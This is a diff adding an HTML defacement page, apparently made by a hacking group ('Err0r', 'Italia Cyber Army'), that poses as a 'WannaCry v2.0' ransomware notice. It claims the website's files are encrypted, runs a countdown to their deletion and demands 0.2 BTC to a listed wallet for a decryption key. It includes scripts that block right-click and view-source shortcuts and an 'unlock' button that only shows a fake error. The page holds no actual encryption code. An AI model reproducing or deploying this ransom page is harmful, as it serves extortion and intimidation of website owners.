@@ -1,0 +1,192 @@
+<html>
+<head>
+<SCRIPT> alert("{#} Hacked By ~ Err0r ~ I.C.A. {#}")</SCRIPT>
+<SCRIPT> alert("{#} Ransomware Succesfully Injected {#}️") </SCRIPT>
+<title>WannaCry v2.0 by Err0r</title>
+<link REL="SHORTCUT ICON" HREF="https://previews.123rf.com/images/baton72/baton721805/baton72180500034/100846822-man-in-the-hood-with-inscription-error-hacker-.jpg">
+<meta property="og:title" content="Hacked by Err0r">
+<style type="text/css">a{color:#8080ff;}#kiri{float:left;}#kiri-gambar{padding-left:30px;padding-top:30px;}#isi{padding-left:50px;}#isi-content{background-color:white;width:65%;font-size:20px;text-align:left;margin-left:30%;padding-left:3px;padding-top:3px;padding-right:3px;padding-bottom:3px;}#isi-judul{font-size:40px;color:white;padding-right:250px;text-align:center;}#isi-window{text-align:left;}#isi-gambar{margin-left:30%;}#isi-kolom{float:left;padding-left:30px;font-size:20px;color:white;}input[type=text],select{width:400px;margin:8px 0;padding:14px 20px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;}button{width:200px;background-color:#4CAF50;color:white;padding:16px 20px;margin:8px 0;border:none;border-radius:4px;cursor:pointer;}#sisa-waktu{font-family:"Palatino Linotype","Book Antiqua",Palatino,serif;font-size:30px;padding-left:30px;padding-top:30px;animation:blink-animation 1s steps(5,start) infinite;-webkit-animation:blink-animation 1s steps(5,start) infinite;}#hacked{padding-top:115px;font-family:"Palatino Linotype","Book Antiqua",Palatino,serif;color:white;width:25%;}@keyframes blink-animation{to{visibility:hidden;}}@-webkit-keyframes blink-animation{to{visibility:hidden;}}#timer{font-family:"Palatino Linotype","Book Antiqua",Palatino,serif;font-size:25px;padding-left:30px;padding-top:none;color:white;}#waktu{border:3px;color:white;}#about{font-family:"Palatino Linotype","Book Antiqua",Palatino,serif;font-size:20px;padding-left:30px;padding-top:100px;}#countdown{font-family:sans-serif;color:#fff;display:inline-block;text-align:center;font-size:30px;background:#ff6600;font-weight:100;width:100%;}</style>
+</head>
+<body style="background:#990000;border: 25px solid #e20733;border-radius:4px;box-sizing: border-box;">
+<div id="kiri">
+<div id="kiri-gambar"><img src="https://cdn-images-1.medium.com/max/1600/1*9oHrezxOYK-GWsxmSkPRlw.gif" height="300px" width="855px"></div>
+<script type="text/javascript">
+		var cday;
+		var timeInSecs;
+		var ticker;
+
+		function getSeconds() {
+		var now = new Date();
+		var nowtime= now.getTime();  // time now in milliseconds
+		var countdowntime = new Date(now.getFullYear(),now.getMonth(),now.getDate(),20,0,0); //  16 hrs = 4 pm
+		// countdowntime - change time hh,mm,ss to whatever time required, e.g. 7,50,0 (0750)
+
+		var dy = 5 ; // Friday (day 5) - change for other days 0-6
+		var atime = countdowntime.getTime();
+		var diff = parseInt((atime - nowtime)/1000);  // positive if date is in future
+		if (diff >0) {
+		cday = dy - now.getDay();     
+		}
+		else {
+	cday =  dy - now.getDay() -1;
+		}
+		if (cday < 0) { cday += 7; }   // aleady passed countdown time, so go for next week
+		if (diff <= 0) { diff += (86400 * 7) }
+		startTimer (diff);
+		}
+
+		function startTimer(secs) {
+		timeInSecs = parseInt(secs);
+	ticker = setInterval("tick()",1000);
+		tick(); // to start counter display right away
+		}
+
+		function tick() {
+		var secs = timeInSecs;
+		if (secs>0)   {
+		timeInSecs--;
+		}
+		else {
+		clearInterval(ticker); // stop counting at zero
+		getSeconds();  // and start all over again!
+		}
+
+		var days = Math.floor(secs/86400);
+		secs %= 86400;
+		var hours= Math.floor(secs/3600);
+		secs %= 3600;
+		var mins = Math.floor(secs/60);
+		secs %= 60;
+		var result = days +":";
+		result += ((hours < 10 ) ? "0":"" ) + hours + ":" + ( (mins < 10) ? "0" : "" ) + mins
+		+ ":" + ( (secs < 10) ? "0":"" ) + secs + "";
+		document.getElementById("countdown").innerHTML =  result;
+		}
+		
+		
+           var isCtrl = false;
+document.onkeyup=function(e)
+{
+    if(e.which == 17)
+    isCtrl=false;
+}
+document.onkeydown=function(e)
+{
+    if(e.which == 17)
+    isCtrl=true;
+    if((e.which == 85) || (e.which == 67) && (isCtrl == true))
+    {
+        return false;
+    }
+}
+var isNS = (navigator.appName == "Netscape") ? 1 : 0;
+if(navigator.appName == "Netscape") document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
+function mischandler(){
+    return false;
+}
+function mousehandler(e){
+    var myevent = (isNS) ? e : event;
+    var eventbutton = (isNS) ? myevent.which : myevent.button;
+    if((eventbutton==2)||(eventbutton==3)) return false;
+}
+document.oncontextmenu = mischandler;
+document.onmousedown = mousehandler;
+document.onmouseup = mousehandler;
+
+		</script>
+<div id="waktu">
+<div id="sisa-waktu">
+All files will be delete on :
+</div>
+<div id="timer">
+<body onload="getSeconds()">
+<div id="CountDownLogo">
+<span id="title"</span>
+							<br>
+							<span id="countdown"> </span>        
+						</div> 
+				</div>		
+
+		<div id="about">
+		<a href="https://en.wikipedia.org/wiki/Bitcoin" target="_blank"><b>About BitCoin</b></a><br><br>
+		<a href="https://www.bitcoin.com/buy-bitcoin" target="_blank"><b>How to buy BitCoin?<b></a><br><br>
+		<a href="/cdn-cgi/l/email-protection#c2b1a7a1b1a7a1b7b0abb6bbf3f1f1f582a5afa3abaeeca1adaf"><b>Contact Us</b></a>
+		</div>
+	</div>
+<div id="isi">	
+<br>
+	<div id="isi-judul"><b>Ooops, your website have been encrypted!</b></div>
+	<br>
+	<div id="isi-content">
+		<div id="content-judul">
+		<u><b>What happened to my website?</u></b></style><br>
+		</div><br>
+		Your important website files are encrypted.<br>
+		Many of your .php, .css, .js, and other files are no longer accessible<br>
+		because they have been encrypted.<br>
+        Maybe you are busy looking for a way to <br>
+		recover your files, but do not waste your time! <br>
+        Nobody can decrypt your files<br>
+		without our special decryption service.<br>
+		<br><br>
+		<div id="content-judul">
+		<u><b>Can i recover my website?</u></b></style><br>
+		</div><br>
+		Sure, we guarantee that you can recover all your files safely and easily.<br>
+        But you have not enough time.<br>
+		You can decrypt all your website file safely, how?<br>
+        You must pay with Bitcoin.<br>
+		<br><br>
+		<div id="content-judul">
+		<u><b>How do i pay?</u></b></style><br>
+		</div><br>
+		Payment is accepted with Bitcoin only, we are not using Paypal, CC, etc.<br>
+        For more information, please click [About BitCoin].<br>
+		For more information, click [How to buy BitCoin]<br>
+		And send the correct amount to the address specified in below<br>
+		After your payment, send payment receipt to email address {<a href="/cdn-cgi/l/email-protection#c2b1a7a1b1a7a1b7b0abb6bbf3f1f1f582a5afa3abaeeca1adaf"><b>Contact Us</b></a>} ,<br>
+        and we will send the decryption key to you.<br>
+		<br><br>
+		<div id="content-judul">
+		<u><b>Contact?</u></b></style><br>
+		</div><br>
+		If you need our assistance, send a message by clicking {<a href="/cdn-cgi/l/email-protection#c2b1a7a1b1a7a1b7b0abb6bbf3f1f1f582a5afa3abaeeca1adaf"><b>Contact Us</b></a>} 
+		</div>
+		<br>
+	<div id="isi-window">
+	<div id="isi-gambar"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTKAnP6a0_qv1qIt-rHjDltkInvW1BSdoObHKRfpgPFF00DcCZp" align="left"></div>
+	<div id="isi-kolom">
+	<br>
+				Payment 0.2 BTC=</font><font color="yellow">16vSaJraVDQaXKSi5fDNk9UhojrZqN5PUu9</font><br>
+				<form action="" method="post" style=" text-align: center;">
+							<label>Key : </label>
+							<input type="text" name="key" class="inpute" placeholder="your unlock key">
+							<button onclick="myFunction()">UNLOCK FILES</button>
+							<script>
+							function myFunction() {
+                            var txt;
+                            if (confirm("Your payment information was not correct!. If you want our help, please contact us on mail below!") == true {
+                            txt = "You pressed OK!";
+                            } else {
+                           txt = "You pressed Cancel!";
+                           }
+                           document.getElementById("demo").innerHTML = txt;
+                           }
+						   </script>
+						</form>	
+					 
+										
+	</div>
+	</div>	
+	<br>
+	<br>
+	<center>
+	<center><font face="Comic Sans MS" size="4" color="green">Copyright®  2020  |</font><font face="Comic Sans MS" size="4" color="red"> All rights Reserved |</font><font face="Comic Sans MS" size="4" color="Green"></font> Err0r</center>
+<marquee behavior="alternate"><br>
+<a href="https://anonitaly.blackblogs.org/"><img src="https://images.wired.it/wp-content/uploads/2017/11/14171650/1510672605_anonymous-italia-768x470.jpg" width="700" height="280">
+</a></marquee>
+	<br><br>
+	<div style="text-shadow: 0px 0px 5px red;">
+<span style="color: white;">
+<b>Good Luck, by: </b><marquee scrollamount="10" direction="left" width="50%">  Italia Cyber Army     --     Crazy4U       --      Err0r      --      Zevinskj       --       CCCP      --      Zannabis      --      Zer0       --      EvliLine       --      Gomma     --      RDX     
+</marquee></script>
